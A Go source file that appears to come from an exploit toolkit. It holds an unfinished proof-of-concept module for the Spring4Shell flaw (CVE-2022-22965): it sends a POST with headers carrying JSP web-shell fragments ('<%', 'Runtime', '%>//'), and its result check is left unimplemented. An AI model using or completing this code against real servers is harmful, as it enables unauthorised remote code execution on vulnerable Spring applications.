package _022

import (
	req2 "github.com/SummerSec/SpringExploit/cmd/commons/req"
	"github.com/SummerSec/SpringExploit/cmd/commons/utils"
	"github.com/fatih/structs"
	"github.com/imroc/req/v3"
	log "github.com/sirupsen/logrus"
)

type CVE202222965 struct{}

func (p CVE202222965) SendPoc(target string, hashmap map[string]interface{}) {
	//TODO implement me
	log.Debugf("[+] Running CVE202222965 poc")
	reqinfo := req2.NewReqInfo()
	reqmap := structs.Map(reqinfo)
	headers := map[string]string{
		"suffix":     "%>//",
		"c1":         "Runtime",
		"c2":         "<%",
		"User-Agent": utils.GetUA(),
	}
	reqmap["url"] = target

	reqmap["headers"] = headers

	reqmap["method"] = "POST"
	// 默认配置
	reqmap["timeout"] = hashmap["Timeout"].(int)
	reqmap["retry"] = hashmap["Retry"].(int)
	reqmap["proxy"] = hashmap["Proxy"].(string)
	reqmap["mode"] = hashmap["Mode"].(int)

	// 发送请求
	resp := utils.Send(reqmap)
	p.CheckExp(resp, target, hashmap["Out"].(string))

}

func (p CVE202222965) SaveResult(target string, file string) {
	context := target + "   存在CVE-2022-22965漏洞\n"
	err := utils.SaveToFile(context, file)
	if err != nil {
		log.Debugf("[-] Save result failed")
		log.Debugf(err.Error())
		return
	}
}

func (p CVE202222965) CheckExp(resp *req.Response, target string, file string) bool {
	//TODO implement me
	panic("implement me")
}
